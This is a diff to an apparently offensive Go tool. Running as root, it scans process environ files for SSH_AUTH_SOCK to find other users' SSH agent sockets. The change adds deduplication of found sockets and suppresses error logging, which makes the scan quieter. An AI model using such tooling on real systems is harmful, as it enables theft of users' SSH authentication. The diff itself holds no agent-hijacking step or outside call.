@@ -24,6 +24,62 @@ const ENVIRON string = "environ"
 // AUTHSOCK is the variable we are looking for in the environ
 const AUTHSOCK string = "SSH_AUTH_SOCK"
 
+// AgentObj will store an agent object.
+type AgentObj struct {
+	Agent string
+}
+
+// AgentStack holds a slice of agentObj's
+type AgentStack struct {
+	Stack []AgentObj
+}
+
+// NewAgentStack creates a new agentstack properly.
+func NewAgentStack() AgentStack {
+	a := AgentStack{}
+	return a
+}
+
+// NewAgentObj creates a new AgentObj properly
+func NewAgentObj(providedAgent string) AgentObj {
+	a := AgentObj{}
+	a.Agent = providedAgent
+	return a
+}
+
+// Push will push a new agent on the pre-defined agent stack. Will
+// return true if this is a new agent and it was successfully pushed
+// onto the stack, false if we have this already.
+func (a *AgentStack) Push(agent string) bool {
+	// first, does this already exist?
+	if a.agentExists(agent) {
+		return false
+	}
+
+	// also if this is just a string(0) then we'll just
+	// return a false because I don't know how better to
+	// handle this and frankly I don't care. My brain is fried.
+	if agent == "0" {
+		return false
+	}
+	// otherwise, it doesn't exist so push it onto the stack.
+	a.Stack = append(a.Stack, NewAgentObj(agent))
+	return true
+}
+
+func (a *AgentStack) agentExists(agent string) bool {
+	// will return true or false if the suspected
+	// agent exists in the list.
+	var exists = false
+	for i := 0; i < len(a.Stack); i++ {
+		if a.Stack[i].Agent == agent {
+			exists = true
+			break
+		}
+	}
+	return exists
+}
+
 func main() {
 	// first and foremost, let's confirm that we're root.
 	if !areWeRoot() {
@@ -35,7 +91,7 @@ func main() {
 
 func loopThrough(loc string) {
 	// This function will do most of the setup.
-
+	a := NewAgentStack()
 	for {
 		validPids, err := findEnviron(loc)
 		if err != nil {
@@ -51,10 +107,11 @@ func loopThrough(loc string) {
 		go parseProc(pidQueue, res)
 
 		for i := 0; i < len(validPids); i++ {
-			myRes := <-res
-			if myRes != "nope" {
-				// YES I KNOW THIS IS DUMB FUCK OFF
-				fmt.Println("Got one:", myRes)
+			select {
+			case foundAgent := <-res:
+				if a.Push(foundAgent) {
+					fmt.Println("Found Agent:", foundAgent)
+				}
 			}
 		}
 	}
@@ -64,7 +121,8 @@ func parseProc(jobQueue <-chan string, resQueue chan<- string) {
 	for pid := range jobQueue {
 		environ, err := dumpEnviron(pid)
 		if err != nil {
-			resQueue <- "nope"
+			// there has to be a better way of handling this
+			resQueue <- "0"
 			continue
 		}
 		resQueue <- environ
@@ -79,7 +137,9 @@ func dumpEnviron(loc string) (string, error) {
 	var ret string
 	e, err := ioutil.ReadFile(loc)
 	if err != nil {
-		log.Println("Error reading the environment file!")
+		// log.Println("Error reading the environment file!")
+		// sometimes we just don't care if we can't read it. No sense
+		// logging it.
 		return ret, err
 	}
 	nullByte := []byte{0}
